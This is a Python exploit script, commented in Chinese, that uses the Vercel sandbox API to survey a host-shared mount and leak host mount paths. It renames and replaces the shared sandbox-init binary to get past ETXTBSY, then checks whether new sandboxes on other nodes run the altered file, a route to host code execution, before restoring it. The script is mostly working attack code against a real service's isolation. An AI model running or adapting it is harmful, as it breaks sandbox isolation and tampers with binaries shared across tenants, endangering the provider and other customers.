# 实验J121: 宿主共享目录勘察 + ETXTBSY 绕过(rename替换) + 跨节点验证
# 动机: j120 证实 /run/vercel/share = 宿主 /volumes/run/vercel/share 的 rw bind mount,
#       sandbox-init 正在被宿主进程执行(ETXTBSY); rename 替换 => 新沙箱 exec 恶意文件 = 宿主 RCE
# 安全: 替换文件 = 原文件+尾部16B标记(可执行性不变); 验证后立即还原
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"
MARKER = b"HACKMARKER16B1234"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=300):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(6):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        time.sleep(4)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

def make_sandbox(name):
    api("DELETE", f"/v2/sandboxes/{name}?teamId={TEAM}&projectId={PROJ}")
    c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
               {"projectId": PROJ, "name": name,
                "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
    if c != 200:
        print(f"create {name}: {c} {r[:200]}", flush=True)
        return None
    return json.loads(r)["sandbox"]["currentSessionId"]

# [1] 创建 A
sid_a = make_sandbox("expj121a")
print("sid A:", sid_a, flush=True)

# [2] 宿主共享目录勘察 + 完整 254:0 挂载点
RECON = r"""
import os, hashlib
print("== ls -la /run/vercel/share ==", flush=True)
try:
    for f in sorted(os.listdir("/run/vercel/share")):
        p = "/run/vercel/share/" + f
        try:
            st = os.stat(p)
            print(f"{f:40s} mode={oct(st.st_mode)} size={st.st_size} ino={st.st_ino}", flush=True)
        except Exception as e:
            print(f"{f:40s} stat FAIL: {e}", flush=True)
except Exception as e:
    print("listdir FAIL:", e, flush=True)

print("== ALL mounts on 254:0 (宿主路径泄露) ==", flush=True)
for line in open("/proc/self/mountinfo"):
    if "254:0" in line:
        parts = line.split()
        print("MI:", parts[3], "->", parts[4], parts[5], flush=True)

print("== sandbox-init 信息 ==", flush=True)
p = "/run/vercel/share/sandbox-init"
data = open(p, "rb").read()
st = os.stat(p)
print("MD5:", hashlib.md5(data).hexdigest(), "SIZE:", len(data), "INO:", st.st_ino, flush=True)
try:
    open("/root/sandbox-init.bak", "wb").write(data)
    print("BACKUP_OK", flush=True)
except Exception as e:
    print("BACKUP_FAIL:", e, flush=True)
print("RECON_DONE", flush=True)
"""
run_cmd(sid_a, RECON, "A-recon")

# [3] rename 替换 (ETXTBSY 绕过) — 原文件保留在 /root, 替换文件=原+标记
SWAP = r"""
import os, hashlib, shutil
p = "/run/vercel/share/sandbox-init"
marker = b"HACKMARKER16B1234"
# 备份(确保有干净副本)
bak = "/root/sandbox-init.bak"
if not os.path.exists(bak):
    open(bak, "wb").write(open(p, "rb").read())
orig = open(bak, "rb").read()
print("BAK_MD5:", hashlib.md5(orig).hexdigest(), flush=True)

# 尝试 rename 原文件 -> 同目录 .orig (rename 不受 ETXTBSY 限制)
try:
    os.rename(p, p + ".orig")
    print("RENAME_OK: sandbox-init -> sandbox-init.orig", flush=True)
except Exception as e:
    print("RENAME_FAIL:", type(e).__name__, e, flush=True)

# 写替换文件 = 原文件 + 标记 (ELF 尾部追加, 可执行性不变)
try:
    with open(p, "wb") as f:
        f.write(orig + marker)
    os.chmod(p, 0o755)
    r = open(p, "rb").read()
    print("NEWFILE_MD5:", hashlib.md5(r).hexdigest(), flush=True)
    print("NEWFILE_SIZE:", len(r), flush=True)
    print("NEWFILE_HAS_MARKER:", marker in r, flush=True)
    st = os.stat(p)
    print("NEWFILE_INO:", st.st_ino, flush=True)
except Exception as e:
    print("NEWFILE_FAIL:", type(e).__name__, e, flush=True)

print("SWAP_DONE", flush=True)
"""
run_cmd(sid_a, SWAP, "A-swap")

# [4] 创建候选沙箱直到命中节点X(节点X 特征: sandbox-init ino==125832488)
# 命中后用 inode 判断节点, 检查是否含标记
for i in range(1, 6):
    name = f"expj121c{i}"
    sid = make_sandbox(name)
    print(f"\n== candidate {name} sid={sid} ==", flush=True)
    if not sid:
        continue
    CHK = r"""
import hashlib, os
p = "/run/vercel/share/sandbox-init"
try:
    data = open(p, "rb").read()
    st = os.stat(p)
    print("INO:", st.st_ino, flush=True)
    print("MD5:", hashlib.md5(data).hexdigest(), flush=True)
    print("SIZE:", len(data), flush=True)
    print("HAS_MARKER:", b"HACKMARKER16B1234" in data, flush=True)
    # 备份文件是否被复制? (验证 /root 不是共享的)
    print("BAK_EXISTS:", os.path.exists("/root/sandbox-init.bak"), flush=True)
    print("ORIG_EXISTS:", os.path.exists(p + ".orig"), flush=True)
except Exception as e:
    print("FAIL:", e, flush=True)
print("CHK_DONE", flush=True)
"""
    run_cmd(sid, CHK, f"C{i}-chk")
    # 只保留第一个命中节点 X 的沙箱继续(不, 全部检查, 看哪些节点受影响)
    api("DELETE", f"/v2/sandboxes/{name}?teamId={TEAM}&projectId={PROJ}")

# [5] 还原 A
RESTORE = r"""
import os, hashlib
p = "/run/vercel/share/sandbox-init"
bak = "/root/sandbox-init.bak"
# 无论当前是什么, 先移走, 再写回备份
try:
    if os.path.exists(p):
        os.rename(p, p + ".hacked")
        print("MOVE_OUT_OK", flush=True)
except Exception as e:
    print("MOVE_OUT_FAIL:", e, flush=True)
try:
    orig = open(bak, "rb").read()
    with open(p, "wb") as f:
        f.write(orig)
    os.chmod(p, 0o755)
    r = open(p, "rb").read()
    print("RESTORE_MD5:", hashlib.md5(r).hexdigest(), flush=True)
    print("RESTORE_MATCH:", r == orig, flush=True)
    print("RESTORE_NO_MARKER:", b"HACKMARKER16B1234" not in r, flush=True)
except Exception as e:
    print("RESTORE_FAIL:", type(e).__name__, e, flush=True)
# 清理残留
for f in [p + ".orig", p + ".hacked"]:
    try:
        os.remove(f)
        print("REMOVED:", f, flush=True)
    except Exception:
        pass
print("RESTORE_DONE", flush=True)
"""
run_cmd(sid_a, RESTORE, "A-restore")

api("DELETE", f"/v2/sandboxes/expj121a?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
